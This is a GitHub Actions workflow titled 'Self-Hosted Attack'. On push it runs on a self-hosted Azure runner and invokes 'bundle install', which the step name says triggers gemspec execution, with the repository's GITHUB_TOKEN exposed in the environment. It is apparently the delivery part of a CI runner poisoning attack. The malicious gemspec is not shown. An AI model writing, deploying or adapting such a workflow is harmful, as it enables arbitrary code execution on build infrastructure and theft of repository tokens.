name: Self-Hosted Attack
on:
  workflow_dispatch:
  push:

jobs:
  attack:
    runs-on: [self-hosted, azure]
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: '3.2'
          
      - name: Bundle Install (triggers gemspec execution)
        run: |
          bundle install
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
